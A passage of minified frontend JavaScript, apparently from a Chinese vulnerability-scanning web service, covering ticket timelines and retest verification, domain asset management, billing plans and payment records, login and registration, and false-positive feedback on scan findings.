class="ticket-closure-next">下一步：'+S(n.nextStep)+"</div>"}if(t){let n=Array.isArray(r.activities)?r.activities:[];n.length===0?t.innerHTML='<div class="ticket-timeline-empty">暂无操作记录</div>':t.innerHTML=n.map(function(d){let f=d.event_type==="note"?"备注更新":d.event_type==="owner"?"负责人调整":d.event_type==="assignee"?"处理人调整":d.event_type==="reviewer"?"复核人调整":"状态流转",v=d.note?'<div class="ticket-activity-note">'+S(d.note)+"</div>":"";return'<div class="ticket-activity-item"><div class="ticket-activity-head"><span class="ticket-activity-type">'+f+'</span><span class="ticket-activity-time">'+S(d.created_at||"")+"</span></div>"+v+"</div>"}).join("")}}).catch(function(){i.innerHTML='<div class="ticket-timeline-empty">加载失败</div>',t&&(t.innerHTML='<div class="ticket-timeline-empty">加载失败</div>')})}function jo(e){if(!confirm("确定对工单 #"+e+" 复测验证？系统会重新扫描并对比修复效果。"))return;let i=document.querySelector('.ticket-detail-actions [data-action="verify"][data-id="'+e+'"]');i&&(i.textContent="验证中...",i.disabled=!0),xo(e).then(function(t){if(Jt(t)){L($t(t),"error"),Fe();return}if(t&&t.success){let s=t.status==="fixed"?"复测通过：漏洞已修复！":"复测完成：漏洞仍存在";return L(s,t.status==="fixed"?"success":"warning"),Fe(),t.status==="fixed"&&setTimeout(function(){Pn(e)},300),We().then(function(){ft(e)})}else L("验证失败："+(t&&t.error?t.error:"未知错误"),"error")}).catch(function(t){L("验证请求失败","error")}).finally(function(){i&&(i.textContent="复测验证",i.disabled=!1)})}function Ho(){try{return localStorage.getItem("vs_token")}catch{return null}}function Do(){return!!Ho()}function No(e){if(!e)return"未知错误";if(typeof e.error=="string"&&e.error)return e.error;if(typeof e.detail=="string"&&e.detail)return e.detail;if(typeof e.message=="string"&&e.message)return e.message;if(Array.isArray(e.detail)&&e.detail.length>0){let i=e.detail.map(function(t){return t&&typeof t.msg=="string"?t.msg:t&&typeof t=="string"?t:""}).filter(Boolean);if(i.length>0)return i.join("；")}return"未知错误"}let ot=[];function $o(){if(!Do()){Zi("asset-list",""),$e("asset-empty","block");let e=document.getElementById("asset-empty");e&&(e.innerHTML='<div class="ticket-empty-icon"></div><p>请先登录查看资产</p><p class="ticket-empty-hint">登录后管理您的域名资产</p>');return}ce("/api/assets").then(function(e){return e.json()}).then(function(e){e&&e.assets?(ot=e.assets,ri(ot)):(ot=[],ri(ot))}).catch(function(e){L("加载资产失败: "+e.message,"error"),ot=[],ri(ot)})}function ri(e){let i=document.getElementById("asset-list"),t=document.getElementById("asset-empty");if(!i)return;if(!e||e.length===0){i.innerHTML="",t&&(t.style.display="block",t.innerHTML='<div class="ticket-empty-icon"></div><p>暂无资产</p><p class="ticket-empty-hint">添加您的第一个域名资产，开始安全扫描</p>');return}t&&(t.style.display="none");let s='<div class="asset-table-wrap"><table class="asset-table">';s+="<thead><tr><th>域名</th><th>负责人</th><th>验证状态</th><th>评分</th><th>操作</th></tr></thead><tbody>",e.forEach(function(r){let o=r.verified||!1,a=o?"verified":"pending",n=o?"已验证":"待人工复核",d=r.score,f="high";d==null?(d="-",f=""):d<50?f="low":d<75&&(f="medium"),s+="<tr>",s+='<td data-label="域名"><div class="asset-domain">'+S(r.domain||"")+'</div><div class="asset-meta">'+S(r.description||"")+"</div></td>",s+='<td data-label="负责人">'+S(r.owner||"-")+"</td>",s+='<td data-label="验证状态"><span class="asset-badge '+a+'">'+n+"</span></td>",s+='<td data-label="评分"><div class="asset-score '+f+'">'+d+"</div></td>",s+='<td data-label="操作"><div class="asset-actions">',s+='<button class="asset-btn primary" onclick="scanAsset('+r.id+", '"+xe(r.domain||"")+`')">扫描</button>`,s+='<button class="asset-btn secondary" onclick="editAsset('+r.id+')">编辑</button>',s+='<button class="asset-btn danger" onclick="deleteAsset('+r.id+')">删除</button>',s+="</div></td>",s+="</tr>"}),s+="</tbody></table></div>",i.innerHTML=s}function Uo(){let e=document.getElementById("asset-domain").value.trim(),i=document.getElementById("asset-owner").value.trim(),t=document.getElementById("asset-description").value.trim(),s=document.getElementById("asset-form-error");if(!e){s&&(s.textContent="请输入域名",s.style.display="block");return}s&&(s.style.display="none"),ce("/api/assets",{method:"POST",body:JSON.stringify({domain:e,owner:i,description:t})}).then(function(r){return r.json()}).then(function(r){if(r.id||r.asset_id)L("资产添加成功","success"),document.getElementById("asset-domain").value="",document.getElementById("asset-owner").value="",document.getElementById("asset-description").value="",$o();else{let o=No(r)||"添加失败";s&&(s.textContent=o,s.style.display="block")}}).catch(function(r){s&&(s.textContent="添加失败: "+r.message,s.style.display="block")})}const Fn=(...e)=>typeof window.navigateTo=="function"&&window.navigateTo(...e),Ci=()=>typeof window.updateUserCredits=="function"&&window.updateUserCredits();function jn(e){return e==null?"--":"¥"+(e/100).toFixed(2)}function qo(e){if(e==null)return"--";let i=parseInt(e,10);return isNaN(i)?String(e):i.toLocaleString("zh-CN")}function Wo(e){let i=parseInt(e&&e.credits,10),t=parseInt(e&&e.price_cents,10);return!i||!t?"--":(t/i/100).toFixed(2)}function Zo(e){if(!e||!e.length)return null;let i=null,t=Number.POSITIVE_INFINITY;return e.forEach(function(s){let r=parseInt(s.credits,10),o=parseInt(s.price_cents,10);if(!r||!o)return;let a=o/r;a<t&&(t=a,i=s.id)}),i}function Xo(e,i){return e.id===i?"推荐":(e.name||"").includes("企业")?"企业版":(e.name||"").includes("专业")?"专业版":(e.name||"").includes("标准")?"标准版":(e.name||"").includes("体验")?"体验版":""}function Vo(e){const i=(e.name||"").toLowerCase();return i.includes("企业")?"团队采购 / 扩容":i.includes("专业")?"安全运营 / 交付":i.includes("标准")?"日常扫描 / 复测":i.includes("体验")?"入门起步":"个人 / 试点使用"}function Go(e){const i=parseInt(e&&e.credits,10)||0;return i>=1e3?"企业采购":i>=500?"专业运营":i>=100?"标准使用":"入门起步"}function Jo(e){return{mock:"开发环境通道",stripe:"Stripe",alipay:"支付宝",wechat:"微信支付"}[e]||e}function Ko(e){return{pending:"待支付",paid:"已到账",failed:"失败",cancelled:"已取消"}[e]||e}function Hn(){if(!ve()){L("请先登录后再查看服务套餐","warn"),Fn("profile");return}Yo(),Et(),ta()}function Yo(){let e=document.getElementById("billing-plans-list");e&&(e.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在加载服务套餐...</div>',kr().then(function(i){let t=i&&i.data&&i.data.plans||i&&i.plans||[];if(!t.length){e.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">暂无可用服务套餐</div>';return}let s=Zo(t),r='<div style="display:flex;flex-direction:column;gap:12px">';r+='<div style="display:flex;flex-wrap:wrap;gap:10px;padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px;color:var(--text-secondary)">',r+="<div>• 所有订单都会进入服务记录，便于财务对账与追踪</div>",r+="<div>• 额度可立即用于体检、复测、修复验证、报告导出和审计留痕</div>",r+="<div>• 生产环境默认仅开放真实支付；开发环境可用通道</div>",r+="</div>",r+='<div style="display:grid;grid-template-columns:repeat(auto-fill,minmax(220px,1fr));gap:12px">',t.forEach(function(o){let a=o.id===s,n=Xo(o,s),d=a?"var(--warning)":"var(--border)",f=a?"0 0 0 1px rgba(240,167,50,0.35)":"none";r+='<div style="background:var(--bg);border:1px solid '+d+";box-shadow:"+f+';border-radius:2px;padding:14px;display:flex;flex-direction:column;gap:8px;position:relative">',n&&(r+='<div style="position:absolute;top:10px;right:10px;background:'+(a?"var(--warning)":"var(--primary)")+';color:#fff;font-size:11px;font-weight:700;padding:3px 8px;border-radius:999px">'+S(n)+"</div>"),r+='<div style="font-size:15px;font-weight:700">'+S(o.name)+"</div>",r+='<div style="font-size:12px;color:var(--text-secondary);min-height:34px">'+S(o.description||"")+"</div>",r+='<div style="font-size:22px;font-weight:700;color:var(--warning)">'+jn(o.price_cents)+"</div>",r+='<div style="font-size:13px;color:var(--text-secondary)">含 <strong style="color:var(--text)">'+qo(o.credits)+"</strong> 积分</div>",r+='<div style="font-size:12px;color:var(--text-secondary)">约 <strong style="color:var(--text)">'+Wo(o)+" 元/积分</strong></div>",r+='<div style="font-size:12px;color:var(--text-secondary)">适合：'+S(Vo(o))+"</div>",r+='<div style="font-size:12px;color:var(--text-secondary)">可用于：扫描 / 复扫 / 报告 / 工单 / 审计</div>',r+='<div style="font-size:12px;color:var(--text-secondary)">权限：'+S(Go(o))+"</div>",r+='<button class="fixer-btn primary" style="width:100%;margin-top:auto" onclick="buyPlan('+o.id+', event)">立即购买</button>',r+="</div>"}),r+="</div>",r+='<div style="padding:12px 14px;background:var(--bg);border:1px solid var(--border);border-radius:2px;font-size:12px;color:var(--text-secondary);line-height:1.7">',r+='<div style="font-weight:700;color:var(--text);margin-bottom:4px">购买后流程</div>',r+="<div>1. 选择套餐并完成支付 → 2. 积分立即到账 → 3. 直接进入扫描或复扫 → 4. 结果会进入报告、工单和审计 → 5. 可按项目或团队需求继续升级。</div>",r+="</div>",r+='<div style="margin-top:12px;padding:12px 14px;background:rgba(75,110,175,0.08);border:1px solid rgba(75,110,175,0.2);border-radius:2px;font-size:12px;color:var(--text-secondary);line-height:1.7">',r+='<div style="font-weight:700;color:var(--primary);margin-bottom:4px">交付前确认</div>',r+="<div>建议上线前重点确认：支付回调签名、积分扣减日志、权限分层、导出权限、审计日志留存，以及客户能否看懂套餐价值与结果证据。</div>",r+="</div>",e.innerHTML=r}).catch(function(i){e.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">加载套餐失败</div>'}))}function Qo(e,i){if(i&&i.stopPropagation(),!ve()){L("请先登录","warn"),Fn("profile");return}let t="mock";window.__STRIPE_PUBLISHABLE_KEY__&&(t="stripe");let s=(window.__PUBLIC_BASE_URL__||window.location.origin).replace(/\/$/,"");_r({plan_id:e,provider:t,success_url:s+"/billing?status=success",cancel_url:s+"/billing?status=cancel"}).then(function(r){if(!r||!r.success){L(Ue(r)||"创建订单失败","error");return}r.data&&r.data.checkout_url?window.location.href=r.data.checkout_url:r.data&&r.data.transaction_id?(L("支付成功，积分已到账","success"),Ci(),Et()):L("订单状态异常","error")}).catch(function(r){L("购买失败："+(r.message||"网络错误"),"error")})}function Et(e){e=parseInt(e,10)||1;let i=10,t=(e-1)*i,s=document.getElementById("billing-records-list");s&&(s.innerHTML='<div style="text-align:center;padding:20px;color:var(--text-secondary)">正在读取充值记录...</div>',Er(i,t).then(function(r){let o=r&&r.data&&r.data.records||r&&r.records||[],a=r&&r.data&&r.data.total||r&&r.total||o.length,n=r&&r.meta||{},d=n.limit||i,f=n.offset||t,v=Math.floor(f/d)+1,c=Math.max(1,Math.ceil(a/d));ea(o),gi("billing-records-pagination",v,c,function(p){Et(p)}),$e("billing-records-pagination",c>1?"flex":"none")}).catch(function(r){s.innerHTML='<div style="text-align:center;padding:20px;color:var(--danger)">读取充值记录失败</div>'}))}function ea(e){let i=document.getElementById("billing-records-list");if(!i)return;if(!e||!e.length){i.innerHTML='<div style="text-align:center;padding:24px;color:var(--text-secondary)">暂无服务记录</div>';return}let t='<div style="display:flex;flex-direction:column;gap:8px">';e.forEach(function(s){let r=s.amount_cents?jn(s.amount_cents):"免费",o=s.status==="paid"?"var(--success)":s.status==="pending"?"var(--warning)":"var(--danger)";t+='<div style="display:flex;align-items:center;justify-content:space-between;padding:10px;background:var(--bg);border:1px solid var(--border);border-radius:2px">',t+="<div>",t+='<div style="font-size:13px;font-weight:600">'+S(s.plan_name||"充值")+"</div>",t+='<div style="font-size:11px;color:var(--text-secondary);margin-top:2px">'+Gt(s.created_at)+" · "+Jo(s.payment_provider)+"</div>",t+="</div>",t+='<div style="text-align:right">',t+='<div style="font-size:13px;font-weight:700">'+r+"</div>",t+='<div style="font-size:11px;color:'+o+';margin-top:2px">'+Ko(s.status)+"</div>",t+="</div></div>"}),t+="</div>",i.innerHTML=t}function ta(){let e=new URLSearchParams(window.location.search),i=e.get("status"),t=e.get("transaction_id");if(!(!i&&!t)){if(i==="cancel"){L("支付已取消","warn"),$i();return}t?(L("正在确认支付结果...","success"),ia(t)):i==="success"&&(L("支付成功","success"),Ci(),Et()),$i()}}function $i(){try{let e=new URL(window.location.href);e.searchParams.delete("status"),e.searchParams.delete("transaction_id"),window.history.replaceState({},"",e.toString())}catch{}}function ia(e){let i=0,t=10,s=setInterval(function(){i++,Sr(e).then(function(r){let o=r&&r.data||r;if(o&&o.status==="paid"){clearInterval(s),L("支付成功，积分已到账","success"),Ci(),Et();return}i>=t&&(clearInterval(s),L("支付结果确认超时，请稍后刷新查看","warn"))}).catch(function(){i>=t&&clearInterval(s)})},2e3)}function na(){typeof window<"u"&&(window.buyPlan=Qo,window.loadBillingPage=Hn)}let ui=null;(function(){var i=!1;function t(s){if(!i){i=!0;try{let r=document.createElement("div");r.style.cssText="position:fixed;top:0;left:0;right:0;bottom:0;background:rgba(0,0,0,0.85);color:#fff;z-index:99999;display:flex;align-items:center;justify-content:center;font-family:system-ui,-apple-system,sans-serif",r.innerHTML='<div style="max-width:500px;padding:30px;background:#1e293b;border-radius:2px;text-align:center;border:1px solid #c75450"><div style="font-size:48px;margin-bottom:12px">!</div><h2 style="margin:0 0 8px;color:#c75450">页面遇到错误</h2><p style="color:#94a3b8;font-size:14px;margin:0 0 16px;line-height:1.6">页面运行过程中出现了未预期的错误，可以刷新页面试试。</p><p style="color:#64748b;font-size:12px;margin:0 0 16px;font-family:monospace;word-break:break-all">'+(s||"未知错误").substring(0,200)+'</p><button onclick="location.reload()" style="background:#4b6eaf;color:#fff;border:none;padding:10px 24px;border-radius:2px;cursor:pointer;font-size:14px;font-weight:600">刷新页面</button></div>',document.body.appendChild(r)}catch(r){console.error("Global error handler failed:",r)}}}window.addEventListener("error",function(s){console.error("Global error:",s.error||s.message),!(s.target&&s.target!==window&&(s.target.tagName==="IMG"||s.target.tagName==="LINK"||s.target.tagName==="SCRIPT"))&&t(s.message||String(s.error))},!0),window.addEventListener("unhandledrejection",function(s){console.error("Unhandled promise rejection:",s.reason)})})();function _e(e){return document.getElementById(e)||null}function ra(e,i){let t=_e(e);t&&(t.innerHTML=i)}function sa(e,i){let t=_e(e);t&&(t.style.display=i)}function Dn(e){document.readyState==="loading"?document.addEventListener("DOMContentLoaded",e,{once:!0}):setTimeout(e,0)}function Ui(e,i){let t=document.getElementById(e),s=document.getElementById(i);!t||!s||t.addEventListener("change",function(){typeof window.updateScanStartState=="function"&&window.updateScanStartState()})}function oa(){Ui("auth-check-step1","scan-btn-step1"),Ui("auth-check","scan-btn");try{aa()}catch(e){console.warn("restoreAuthCheckbox error:",e)}}var mt=!1;function aa(){let e=!1;try{e=localStorage.getItem("vs_auth_checked")==="true"}catch{}let i=document.getElementById("auth-check-step1"),t=document.getElementById("auth-check"),s=document.getElementById("batch-auth-check");if(e){mt=!0,i&&(i.checked=!0),t&&(t.checked=!0),s&&(s.checked=!0),mt=!1;let o=document.getElementById("scan-btn-step1"),a=document.getElementById("scan-btn"),n=document.getElementById("batch-go-btn");o&&(o.disabled=!1),a&&(a.disabled=!1),n&&(n.disabled=!1)}function r(o,a){o&&o.addEventListener("change",function(){if(mt)return;let n=o.checked;mt=!0,a.forEach(function(c){c&&(c.checked=n)}),mt=!1;let d=document.getElementById("scan-btn-step1"),f=document.getElementById("scan-btn"),v=document.getElementById("batch-go-btn");d&&(d.disabled=!n),f&&(f.disabled=!n),v&&(v.disabled=!n);try{localStorage.setItem("vs_auth_checked",n?"true":"false")}catch{}})}r(i,[t,s]),r(t,[i,s]),r(s,[i,t])}function fe(e){if(e==null)return"";let i=document.createElement("div");return i.appendChild(document.createTextNode(String(e))),i.innerHTML}function la(e){return String(e??"").replace(/'/g,"&#39;").replace(/"/g,"&quot;")}function rt(e){if(!e)return"未知错误";if(typeof e.error=="string"&&e.error)return e.error;if(typeof e.detail=="string"&&e.detail)return e.detail;if(typeof e.message=="string"&&e.message)return e.message;if(Array.isArray(e.detail)&&e.detail.length>0){let i=e.detail.map(function(t){return t&&typeof t.msg=="string"?t.msg:t&&typeof t=="string"?t:""}).filter(Boolean);if(i.length>0)return i.join("；")}return"未知错误"}function qi(e,i){let t=_e(e);t&&(i?(t.disabled=!0,t.dataset.originalText=t.dataset.originalText||t.textContent,t.innerHTML='<span class="spinner" style="width:16px;height:16px;margin-right:6px;border-color:rgba(255,255,255,0.3);border-top-color:#fff"></span>'+fe(t.dataset.originalText)):(t.disabled=!1,t.dataset.originalText&&(t.textContent=t.dataset.originalText)))}function Yt(){try{return localStorage.getItem("vs_token")}catch{return null}}function Nn(e){try{localStorage.setItem("vs_token",e)}catch{}}function $n(){try{localStorage.removeItem("vs_token")}catch{}}function Le(){return!!Yt()}function da(){try{return localStorage.getItem("vs_username")||""}catch{return""}}function Qe(){let e=Yt();return e?{Authorization:"Bearer "+e}:{}}function ke(e,i){i=i||{},i.headers=i.headers||{};let t=!!i.skipAuthExpiry,s=Yt();s&&(i.headers.Authorization="Bearer "+s),!i.headers["Content-Type"]&&i.body&&(i.headers["Content-Type"]="application/json");let r=e.indexOf("http")===0?e:Oi+e;return fetch(r,i).then(function(o){if(o.status===404&&e.indexOf("/api/")===0&&e.indexOf("/api/v1/")!==0){let a=e.indexOf("http")===0?e:Oi+"/api/v1"+e.slice(4);return fetch(a,i)}if(o.status===401&&!t){$n();try{localStorage.removeItem("vs_username")}catch{}throw typeof ut=="function"&&ut(),new Error("登录已过期，请重新登录")}return o}).catch(function(o){throw o.message&&o.message.indexOf("请求失败")>=0?new Error("网络请求失败。请确认本地后端是否已启动。"):o})}async function Vt(){let e=document.getElementById("auth-challenge-question"),i=document.getElementById("auth-challenge-question-reg"),t=document.getElementById("auth-challenge-token"),s=document.getElementById("auth-challenge-token-reg"),r=document.getElementById("login-challenge-answer"),o=document.getElementById("reg-challenge-answer");try{let a=await ke("/api/auth/challenge",{skipAuthExpiry:!0}),n=await Ve(a);n&&n.data&&(n=n.data),e&&(e.textContent="验证码："+(n.question||"请先刷新验证码")),i&&(i.textContent="验证码："+(n.question||"请先刷新验证码")),t&&(t.value=n.token||""),s&&(s.value=n.token||""),r&&(r.value=""),o&&(o.value="")}catch{e&&(e.textContent="验证码加载失败，请刷新页面")}}function ca(){Vt()}function Un(e){let i=document.getElementById("auth-guest"),t=document.getElementById("auth-register"),s=document.getElementById("auth-reset"),r=document.getElementById("auth-logged");e==="register"?(i&&(i.style.display="none"),t&&(t.style.display="block"),s&&(s.style.display="none"),r&&(r.style.display="none"),Vt()):e==="login"?(Vt(),i&&(i.style.display="block"),t&&(t.style.display="none"),s&&(s.style.display="none"),r&&(r.style.display="none")):e==="reset"&&(i&&(i.style.display="none"),t&&(t.style.display="none"),s&&(s.style.display="block"),r&&(r.style.display="none"))}function ut(){let e=document.getElementById("auth-guest"),i=document.getElementById("auth-register"),t=document.getElementById("auth-reset"),s=document.getElementById("auth-logged"),r=document.getElementById("scan-login-tip"),o=document.getElementById("api-token-input");if(Le()){e&&(e.style.display="none"),i&&(i.style.display="none"),t&&(t.style.display="none"),s&&(s.style.display="block"),r&&(r.style.display="none");let a=da(),n=document.getElementById("auth-display-name");if(n&&(n.textContent=a||"用户"),o){let d=Yt();o.value=d||"令牌 不可用"}}else e&&(e.style.display="block"),i&&(i.style.display="none"),t&&(t.style.display="none"),s&&(s.style.display="none"),r&&(r.style.display="block"),o&&(o.value="登录后显示 令牌");typeof window.updateScanStartState=="function"&&window.updateScanStartState(),typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon()}function pa(){if(!Le()){ie("请先登录","error");return}let e=document.getElementById("api-token-input");if(!e||!e.value||e.value.indexOf("登录")!==-1||e.value==="令牌 不可用"){ie("令牌 不可用，请重新登录","error");return}navigator.clipboard&&navigator.clipboard.writeText?navigator.clipboard.writeText(e.value).then(function(){ie("令牌 已复制","success")}).catch(function(){ie("复制失败","error")}):ie("浏览器不支持自动复制，请手动选择文本复制","error")}function ua(){if(!Le()){ie("请先登录后再修改密码"),Un("login");return}let e=document.getElementById("reset-new-password"),i=document.getElementById("reset-new-password2"),t=document.getElementById("reset-error");if(!e||!i){ie("密码重置表单加载失败");return}let s=e.value,r=i.value;if(t&&(t.textContent=""),!s||s.length<6){t&&(t.textContent="新密码至少 6 个字符");return}if(s!==r){t&&(t.textContent="两次密码不一致");return}ke("/api/reset-password",{method:"POST",body:JSON.stringify({new_password:s})}).then(Ve).then(function(o){o.success?(ie("密码已修改，请用新密码登录"),qn()):t.textContent=rt(o)||"修改失败"}).catch(function(o){t&&(t.textContent="修改失败: "+o.message)})}function Wi(){let e=document.getElementById("login-username"),i=document.getElementById("login-password");document.getElementById("auth-challenge-token"),document.getElementById("login-challenge-answer");let t=document.getElementById("login-error");if(!e||!i){ie("登录表单加载失败");return}let s=e.value.trim(),r=i.value.trim();if(t&&(t.textContent=""),!s||!r){t&&(t.textContent="请输入用户名和密码");return}ke("/api/login",{skipAuthExpiry:!0,method:"POST",body:JSON.stringify({username:s,password:r})}).then(Ve).then(function(o){let a=o.token||o.data&&o.data.token,n=o.username||o.data&&o.data.username||s;if(a){Nn(a),Yi(o.role||o.data&&o.data.role||"member");try{localStorage.setItem("vs_username",n)}catch{}ut(),et(),Fe(),typeof window.updateScanCreditsHint=="function"&&window.updateScanCreditsHint(),typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon(),ie("登录成功，欢迎 "+n),zt("scan"),setTimeout(function(){typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon()},0)}else t&&(t.textContent=rt(o)||"登录失败")}).catch(function(o){t&&(t.textContent="登录失败: "+o.message)})}function Ot(){let e=document.getElementById("reg-username"),i=document.getElementById("reg-email"),t=document.getElementById("reg-password"),s=document.getElementById("reg-password2"),r=document.getElementById("register-error");if(!e||!t||!s){ie("注册表单加载失败");return}let o=e.value.trim(),a=i?i.value.trim():"",n=t.value.trim(),d=s.value.trim(),f=document.getElementById("auth-challenge-token-reg")||document.getElementById("auth-challenge-token"),v=document.getElementById("reg-challenge-answer");if(r&&(r.textContent=""),!o||!n){r&&(r.textContent="请输入用户名和密码");return}if(n!==d){r&&(r.textContent="两次密码不一致");return}if(n.length<6){r&&(r.textContent="密码至少 6 个字符");return}let c={username:o,password:n,challenge_token:f?f.value:"",challenge_answer:v?v.value.trim():""};a&&(c.email=a),ke("/api/register",{skipAuthExpiry:!0,method:"POST",body:JSON.stringify(c)}).then(Ve).then(function(p){let h=p.token||p.data&&p.data.token,m=p.username||p.data&&p.data.username||o;if(h){Nn(h),Yi(p.role||p.data&&p.data.role||"member");try{localStorage.setItem("vs_username",m)}catch{}ut(),et(),Fe(),typeof window.updateScanCreditsHint=="function"&&window.updateScanCreditsHint(),typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon(),ie("注册成功，欢迎 "+m),zt("scan"),setTimeout(function(){typeof window.refreshScanStartStateSoon=="function"&&window.refreshScanStartStateSoon()},0)}else r&&(r.textContent=rt(p)||"注册失败")}).catch(function(p){r&&(r.textContent="注册失败: "+p.message)})}function qn(){$n();try{localStorage.removeItem("vs_username"),localStorage.removeItem("vs_role")}catch{}ut();let e=document.getElementById("nav-alert-badge");e&&(e.style.display="none"),ie("已退出登录"),zt("home")}function zt(e){try{if(e==="scan"){let r=document.getElementById("page-home");r&&r.classList.add("active"),document.querySelectorAll(".page").forEach(function(n){n.id!=="page-home"&&n.classList.remove("active")});let o=document.querySelector('.nav-item[data-page="scan"]');o&&o.classList.add("active"),document.querySelectorAll(".nav-item").forEach(function(n){n.getAttribute("data-page")!=="scan"&&n.classList.remove("active")});let a=document.querySelector(".scan-section");a&&a.scrollIntoView({behavior:"smooth",block:"start"}),typeof window.loadDashboard=="function"&&window.loadDashboard();return}let i=document.getElementById("page-"+e);i&&i.classList.add("active"),document.querySelectorAll(".page").forEach(function(r){r.id!=="page-"+e&&r.classList.remove("active")});let t=e==="result"?"scan":e,s=document.querySelector('.nav-item[data-page="'+t+'"]');s&&s.classList.add("active"),document.querySelectorAll(".nav-item").forEach(function(r){r.getAttribute("data-page")!==t&&r.classList.remove("active")}),window.scrollTo({top:0,behavior:"smooth"}),e==="tickets"&&(ko(),We()),e==="assets"&&Ti(),e==="evolution"&&Qt(),e==="billing"&&Hn(),e==="audit"&&typeof window.fillAuditTargetFromScan=="function"&&window.fillAuditTargetFromScan()}catch(i){console.error("navigateTo error:",i)}}let fi=[],Rt=0,fa=3,ga=2500;function ie(e,i){fi.push({msg:e,type:i}),Wn()}function Wn(){if(Rt>=fa||fi.length===0)return;let e=fi.shift();Rt++;let i=document.getElementById("toast-container");if(!i){Rt--;return}let t=document.createElement("div");t.className="toast";let s="ℹ️";e.type==="error"?s="[错误]":e.type==="success"?s="[成功]":e.type==="warn"&&(s="[警告]");let r=document.createElement("span");r.textContent=s+" ",r.style.marginRight="6px",t.appendChild(r),t.appendChild(document.createTextNode(e.msg)),e.type==="error"?t.classList.add("error"):e.type==="success"&&t.classList.add("success"),i.appendChild(t),requestAnimationFrame(function(){requestAnimationFrame(function(){t.classList.add("show")})}),setTimeout(function(){t.classList.add("hiding"),t.classList.remove("show"),setTimeout(function(){t.parentNode&&t.parentNode.removeChild(t),Rt--,Wn()},300)},ga)}function ha(e,i,t,s){if(!i){ie("finding 名称缺失","error");return}if(!Le()){ie("请先登录后再标记误报","error");return}if(e.disabled)return;e.disabled=!0;let r=e.innerHTML;e.innerHTML="提交中...";let o=typeof ke=="function"?ke:fetch,a="/api/finding/feedback",n=JSON.stringify({scan_id:t||0,finding_name:i,is_false_positive:!!s,is_confirmed:!s}),d=o(a,{method:"POST",headers:{"Content-Type":"application/json"},body:n});Promise.resolve(d).then(function(f){return f.json().then(function(v){return{ok:f.ok,d:v}})}).then(function(f){if(f.ok&&f.d&&f.d.success){let v=e.closest(".finding-detail");if(v)if(s){v.classList.add("fp-marked"),v.classList.remove("confirmed");let p=v.querySelector(".finding-detail-header");if(p&&!p.querySelector(".fp-badge")){let m=document.createElement("span");m.className="fp-badge",m.textContent="已被标记为误报",p.appendChild(m)}let h=v.querySelector(".finding-feedback-row");if(h&&!h.querySelector(".fp-reason-text")){let m=document.createElement("span");m.className="fp-reason-text",m.textContent="已标记为误报，将用于优化未来检测",h.appendChild(m)}}else{v.classList.add("confirmed"),v.classList.remove("fp-marked");let p=v.querySelector(".finding-detail-header");if(p&&!p.querySelector(".confirmed-badge")){let m=document.createElement("span");m.className="confirmed-badge",m.textContent="已确认",p.appendChild(m)}let h=v.querySelector(".finding-feedback-row");if(h&&!h.querySelector(".fp-reason-text")){let m=document.createElement("span");m.className="fp-reason-text",m.style.color="#73c990",m.textContent="已确认为真实漏洞，感谢您的反馈",h.appendChild(m)}}(v||document).querySelectorAll(".finding-feedback-row .finding-feedback-btn").forEach(function(p){p.disabled=!0,p.textContent=p.classList.contains("btn-confirm")?"准确":"误报"}),ie(s?"已记录为误报，感谢反馈！":"已确认为真实漏洞，感谢反馈！","success")}else e.disabled=!1,e.innerHTML=r,ie("提交失败: "+(f.d&&(f.d.error||f.d.detail)||"未知错误"),"error")}).catch(function(f){e.disabled=!1,e.innerHTML=r,ie("提交失败: "+f.message,"error")})}let Je=[];function Ti(){if(!Le()){ra("asset-list",""),sa("asset-empty","block");let e=document.getElementById("asset-empty");e&&(e.innerHTML='<div class="ticket-empty-icon"></div><p>请先登录查看资产</p><p class="ticket-empty-hint">登录后管理您的域名资产</p>');return}ke("/api/assets").then(function(e){return e.json()}).then(function(e){e&&e.assets?(Je=e.assets,si(Je)):(Je=[],si(Je))}).catch(function(e){ie("加载资产失败: "+e.message,"error"),Je=[],si(Je)})}function si(e){let i=document.getElementById("asset-list"),t=document.getElementById("asset-empty");if(!i)return;if(!e||e.length===0){i.innerHTML="",t&&(t.style.display="block",t.innerHTML='<div class="ticket-empty-icon"></div><p>暂无资产</p><p class="ticket-empty-hint">添加您的第一个域名资产，开始安全扫描</p>');return}t&&(t.style.display="none");let s='<div class="asset-table-wrap"><table class="asset-table">';s+="<thead><tr><th>域名</th><th>负责人</th><th>验证状态</th><th>评分</th><th>操作</th></tr></thead><tbody>",e.forEach(function(r){let o=r.verified||!1,a=o?"verified":"pending",n=o?"已验证":"待人工复核",d=r.score,f="high";d==null?(d="-",f=""):d<50?f="low":d<75&&(f="medium"),s+="<tr>",s+='<td data-label="域名"><div class="asset-domain">'+fe(r.domain||"")+'</div><div class="asset-meta">'+fe(r.description||"")+"</div></td>",s+='<td data-label="负责人">'+fe(r.owner||"-")+"</td>",s+='<td data-label="验证状态"><span class="asset-badge '+a+'">'+n+"</span></td>",s+='<td data-label="评分"><div class="asset-score '+f+'">'+d+"</div></td>",s+='<td data-label="操作"><div class="asset-actions">',s+='<button class="asset-btn primary" onclick="scanAsset('+r.id+", '"+la(r.domain||"")+`')">扫描</button>`,s+='<button class="asset-btn secondary" onclick="editAsset('+r.id+')">编辑</button>',s+='<button class="asset-btn danger" onclick="deleteAsset('+r.id+')">删除</button>',s+="</div></td>",s+="</tr>"}),s+="</tbody></table></div>",i.innerHTML=s}function Qt(){if(!Le()){let i=document.getElementById("evolution-content");i&&(i.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>请先登录</p><p class="ticket-empty-hint">登录后使用智能学习、主动监控、团队协作与安全顾问</p></div>');return}let e=document.getElementById("evolution-content");e&&(e.innerHTML='<div class="loading">正在读取进化中心数据...</div>'),ke("/api/evolution/dashboard").then(function(i){return i.json()}).then(function(i){i&&i.success?va(i):e&&(e.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>暂未登录或无数据</p></div>')}).catch(function(i){e&&(e.innerHTML='<div class="ticket-empty"><div class="ticket-empty-icon"></div><p>加载失败: '+fe(i.message)+"</p></div>")})}function va(e){let 